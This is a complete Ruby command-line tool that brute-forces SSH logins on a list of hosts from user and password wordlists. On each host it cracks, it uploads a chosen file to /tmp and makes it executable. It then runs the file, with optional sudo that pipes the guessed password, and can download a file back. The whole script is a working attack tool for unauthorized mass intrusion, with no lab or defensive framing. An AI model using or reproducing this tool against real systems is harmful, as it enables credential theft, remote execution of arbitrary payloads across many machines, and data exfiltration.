#!/usr/bin/env ruby

#file is uploaded and executed, outputfile downloaded if needed

require 'rubygems'
require 'getopt/std'
require 'net/ssh'
require 'net/scp'

$userlist="user.txt"
$passwdlist="password.txt"

#if user:passwd combo is found, print, and go to next phase
#else print error, go to next host
#XXX: insert key shortcut to skip already known host
def crack_user(host)
	File.open($userlist, 'r').each_line do |u|
		u=u.strip
		File.open($passwdlist, 'r').each_line do |p|
			p=p.strip
			begin
				puts "\e[1;33m[-]\e[00m trying user: #{u} - password: #{p}" if $debugFlag
				Net::SSH.start(host,u, :password => p)
			rescue Net::SSH::AuthenticationFailed
			# rescue, other errors should be managed by caller 
			else
				puts "\e[1;32m[*]\e[00m #{host}: #{u}:#{p}"
				return u,p
			end
		end
	end
	puts "\e[1;31m[*]\e[00m no password found for #{host}"
	return nil
end

######MAIN#######
abort "usage:./crack-upload-n-deploy_command.rb [-s] [-v] [-d <downloadfile>] [-P <prefix>] <file> [<iplist>]" if ARGV.size < 2

opt = Getopt::Std.getopts("svf:d:sP:")

sudo=false
downflag=false
$debugFlag=false

if opt['d']
    downflag=true
    downfile=opt['d']
end
if opt['s']
    sudo=true
end
if opt['P']
    #special prefix to pipe into command, somewhat a quirk
    prefix="#{opt['P']} |"
else
    prefix=""
end
if opt['v']
	$debugFlag=true
end

deployfile=ARGV[0]
iplist=ARGV[1]

#XXX: generally good (for now)
rpath="/tmp"

File.open(iplist, 'r').each_line do |l|
    l =~ /^(\S+);((\d+\.){3}\d+)/
    host = $1
    ip = $2
    begin
        #Net::SCP.upload! ip, user, rpath, deployfile, :password => passwd
        #puts "executing..."
        
        #crack phase, iterate users and passwords
        puts "\e[1;34m[+]\e[00m trying host #{host}.." #if $debugFlag
        res=crack_user(ip)
        next unless res
        user = res[0];passwd = res[1]
        
        Net::SSH.start(ip, user, :password => passwd) do |ssh|
            puts "\e[1;34m[+]\e[00m uploading to host #{host}"
            ssh.scp.upload! deployfile, rpath
            puts "\e[1;34m[+]\e[00m changing permissions..."
            cmd = "#{rpath}/#{deployfile}"
            sudoprefix="echo #{passwd}| sudo -S -p \"\""
            if sudo
                out = ssh.exec!("#{sudoprefix} chmod a+x \"#{cmd}\"")
            else
                out = ssh.exec!("chmod a+x \"#{cmd}\"")
            end
            puts out if out
            puts "\e[1;34m[+]\e[00m executing..."
            #XXX: warning! attention to prefixes!!
            if sudo
                out = ssh.exec!("#{sudoprefix} #{prefix}#{rpath}/#{deployfile}")
            else
                out = ssh.exec!("#{prefix}#{rpath}/#{deployfile}")
            end
            puts out if out
            if downflag
                puts "\e[1;34m[+]\e[00m downloading #{downfile}"
                if sudo
                    out = ssh.exec!("#{sudoprefix} chmod a+r \"#{downfile}\"")
                    puts out if out
                end
                #for now download in pwd
                ssh.scp.download! downfile, "./"
            end
        end
    rescue Net::SSH::AuthenticationFailed
        $stderr.puts "\e[1;31m[*]\e[00m authentication failed for #{host}\n"
        next
    rescue Net::SSH::HostKeyMismatch
        $stderr.puts "\e[1;31m[*]\e[00m Host key mismatch for #{host}\n"
        next
    rescue Net::SSH::Disconnect
        $stderr.puts "\e[1;31m[*]\e[00m disconnected from #{host}\n"
        next
    rescue Errno::ECONNRESET
        $stderr.puts "\e[1;31m[*]\e[00m connection reset from #{host}\n"
        next
    rescue Errno::EHOSTUNREACH 
        $stderr.puts "\e[1;31m[*]\e[00m No route to host #{host}\n"
        next
    rescue Errno::ETIMEDOUT
        $stderr.puts "\e[1;31m[*]\e[00m connection timeout for #{host}\n"
        next
	rescue Timeout::Error 
		$stderr.puts "\e[1;31m[*]\e[00m connection timeout for #{host}\n"
		next
    rescue Errno::ECONNREFUSED
        $stderr.puts "\e[1;31m[*]\e[00m connection refused for #{host}\n"
        next
    rescue Errno::ENETUNREACH 
        $stderr.puts "\e[1;31m[*]\e[00m unreacheable host #{host}\n"
        next
    end
end
